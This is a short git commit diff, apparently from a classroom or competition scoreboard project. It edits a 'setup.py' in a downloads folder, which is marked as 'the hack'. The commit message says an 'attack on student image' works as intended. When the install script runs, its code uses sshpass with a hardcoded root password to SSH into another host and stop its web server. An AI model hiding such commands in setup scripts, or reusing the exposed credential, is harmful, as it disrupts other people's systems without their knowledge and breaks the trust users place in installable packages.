ddbfe3fe2d27b8e4ae21b10b4b68ef18205d0670
Derrick Hamilton <derrickhamilton212@gmail.com>
2018-05-14 20:41:12 -0400

    attack on student image is working as intended

--- Scoreboard/Scoreboard/Downloads/prob1/setup.py
+++ Scoreboard/Scoreboard/Downloads/prob1/setup.py
@@ -1,6 +1,6 @@
 # this is the hack
 
-cmd = "sshpass -p 'goodyear123!@#' ssh -t root@192.168.1.8 sudo service httpd stop";
+cmd = "sshpass -p'goodyear123!@#' ssh -t root@192.168.1.8 service httpd stop";
 import os;
 os.system(cmd);
 
